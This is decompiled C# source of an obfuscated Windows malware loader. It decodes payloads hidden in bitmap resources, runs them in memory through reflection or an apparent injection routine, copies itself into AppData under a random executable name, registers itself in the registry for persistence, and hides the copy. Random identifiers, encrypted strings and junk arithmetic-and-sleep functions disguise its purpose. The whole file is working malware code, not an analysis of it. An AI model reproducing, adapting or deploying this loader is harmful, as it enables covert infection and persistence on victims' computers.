using System;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

[StandardModule]
internal sealed class Module1
{
	[STAThread]
	public static void Main()
	{
		NDjpgfwvdnEvFh(string.Empty);
	}

	public static void BLjCSvWOeQyPStP(byte[] FlrNcmhmbJFxPYb)
	{
		Thread thread = new Thread(BLjCSvWOeQyPStP);
		thread.SetApartmentState(ApartmentState.STA);
		thread.Start(FlrNcmhmbJFxPYb);
	}

	public static void BLjCSvWOeQyPStP(object RfDOpyKOUYPex)
	{
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		try
		{
			MethodInfo entryPoint = Assembly.Load((byte[])RfDOpyKOUYPex).EntryPoint;
			entryPoint.Invoke(null, (entryPoint.GetParameters().Length == 1) ? new string[1][] { new string[0] } : null);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ResourceManager resourceManager = new ResourceManager("rsc", Assembly.GetExecutingAssembly());
			Bitmap inputBMP = (Bitmap)resourceManager.GetObject("wxihTlpa");
			object obj = gooahYbXEKO.bitmapToBytes(inputBMP);
			zrPJvtgVvkjTHZT.pmahSJbRVuVe(ZxIBaTCINOX: new object[2]
			{
				RuntimeHelpers.GetObjectValue(RfDOpyKOUYPex),
				Conversions.ToString(Environment.SystemDirectory[0]) + tNcqokDpycaNeQR.blDzbPSaQun("y3l51Zpp7V2c1O7cYTVXDE4Dvi1pyTYfZcLiXblxvUdemOCRLKQDtOD8DPA6IhuxyrHHG+/E1p3GJW0N3oKQpQ==", "zC01Zytyw3j")
			}, nftxsCTYstPDe: tNcqokDpycaNeQR.blDzbPSaQun("yL4nC2XH0VcmH9QYFXVrTw==", "SaOE1ckLOR"), amhjjrYHZYnOYFc: tNcqokDpycaNeQR.blDzbPSaQun("yAMrDlfcQxb7Njp3DANrZA==", "fH3Jas5G9k9"), KphcBfapFk: (byte[])obj);
			ProjectData.ClearProjectError();
		}
	}

	public static void NDjpgfwvdnEvFh(string DbtxDpHNSSkkvSr)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		ResourceManager resourceManager = new ResourceManager("rsc", Assembly.GetExecutingAssembly());
		Bitmap inputBMP = (Bitmap)resourceManager.GetObject("UnNCsfKSZYBmdP");
		object obj = gooahYbXEKO.bitmapToBytes(inputBMP);
		BLjCSvWOeQyPStP(RuntimeHelpers.GetObjectValue(obj));
		object folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		folderPath = Operators.ConcatenateObject(folderPath, (object)"\\mnrzQ3F8WVhH.exe");
		object obj2 = "EzLKJcKrQKwMSGqUJveE";
		try
		{
			if (!File.Exists(Conversions.ToString(folderPath)))
			{
				File.Copy(Application.get_ExecutablePath(), Conversions.ToString(folderPath));
				eJMBhkDyHTh(Conversions.ToString(obj2), Conversions.ToString(folderPath));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void eJMBhkDyHTh(string NQfjlXqtFfQDS, string CXPBzBGnvi)
	{
		try
		{
			RegistryKey currentUser = Registry.CurrentUser;
			RegistryKey registryKey = currentUser.OpenSubKey(tNcqokDpycaNeQR.blDzbPSaQun("sX0h+p5YDCDfw5bA7mn4G4Lh/dWWt6boWV9eyCyuJ8obygZNCH66kQJ62HWzW0aZ", "ZS1i4fyrVu"), writable: true);
			registryKey.SetValue(NQfjlXqtFfQDS, CXPBzBGnvi, RegistryValueKind.String);
			FileInfo fileInfo = new FileInfo(CXPBzBGnvi);
			fileInfo.Attributes = FileAttributes.Hidden;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static object HvOcCUvJdhEiD()
	{
		decimal num = 0.944m;
		string text = "SOCjCrl7";
		int value = 236372;
		decimal num2 = new decimal(0.8533636751528944 - Convert.ToDouble(num));
		decimal value2 = new decimal(-0.7193172737955347 - Convert.ToDouble(decimal.Multiply(num, num2)));
		decimal num3 = new decimal(Convert.ToDouble(num) / 1.097 - Convert.ToDouble(num2) / 0.168);
		text = text + "v91vng" + text + "fh";
		Thread.Sleep(2);
		if (-0.2990866141732284 == 272.0 / 807.0 - 0.5916844547563805 * Convert.ToDouble(value2))
		{
			text = "WUFmauXDHEWBP6nIoP7" + text + text;
		}
		value2 = new decimal(Convert.ToDouble(num) - Convert.ToDouble(num2) * 1.468677494199536 - Convert.ToDouble(num2));
		if (Convert.ToDouble(decimal.Multiply(num, value2)) != 1.0434782608695654 * Convert.ToDouble(value2) / 0.577)
		{
			num = 0.0440543710021321m;
			Thread.Sleep(1);
		}
		Thread.Sleep(3);
		if (Operators.CompareString(text + "Nov" + text + Conversions.ToString(Strings.Chr(217)) + Conversions.ToString(Strings.Chr(219)) + text, "X0rCIDOHMnUuz47E5HQSLbalUTy6Ub7N2BuMBww8gv6OtpCZMLyRlgs6kQi5b3xnD" + text + text, false) == 0)
		{
			Thread.Sleep(15);
		}
		value2 = new decimal(Convert.ToDouble(num3) * 1.019);
		if (Convert.ToDouble(num2) == Convert.ToDouble(value2) / 0.16199999999999992)
		{
			Thread.Sleep(12);
		}
		num = new decimal(0.46075949367088603 * Convert.ToDouble(num2));
		if (decimal.Compare(decimal.Subtract(decimal.Add(Math.Round(num2), new decimal(4L)), new decimal(103L)), new decimal(value)) == 0)
		{
			Thread.Sleep(9);
			value2 = decimal.Multiply(num, num2);
			value = Convert.ToInt32(decimal.Subtract(new decimal(-58963L), decimal.Add(Math.Floor(num), new decimal(3L))));
			Thread.Sleep(12);
		}
		num = new decimal(Convert.ToDouble(num) * 0.967 + Convert.ToDouble(num2));
		_ = text + Conversions.ToString(Strings.Chr(133)) + "LWn7din7y";
		Thread.Sleep(28);
		value = 192386;
		if (185.0 / 384.0 == Convert.ToDouble(num2) - 419.0 / 775.0 + Convert.ToDouble(num3))
		{
			num = decimal.Subtract(decimal.Divide(num2, num3), decimal.Multiply(num2, num2));
		}
		Convert.ToInt32(decimal.Add(new decimal(value), decimal.Add(Math.Round(num2), new decimal(10L))));
		Thread.Sleep(18);
		text = "ePmr2s5p3VSECb8i5lJ5Frr8M1C6QRXZOw1KHjFW?";
		object result = default(object);
		return result;
	}

	public static void cjiNITmHaooiEhx()
	{
		string text = "9\u007fUV50sSL" + Conversions.ToString(Strings.Chr(196)) + "Z16Lp";
		Thread.Sleep(30);
		text = text + text + text + "0nKwaYcr9suwvi5CQqktHZCQTtRqpa3RdbXk";
		Thread.Sleep(7);
		Thread.Sleep(23);
		Thread.Sleep(26);
		text = text + "\u000e" + text + "NNM1UHhdKLilqWpSXhNi2";
		Thread.Sleep(12);
		Thread.Sleep(4);
		Thread.Sleep(18);
		text += "wTItbCN3SbeWjekacWI\u0002";
	}
}
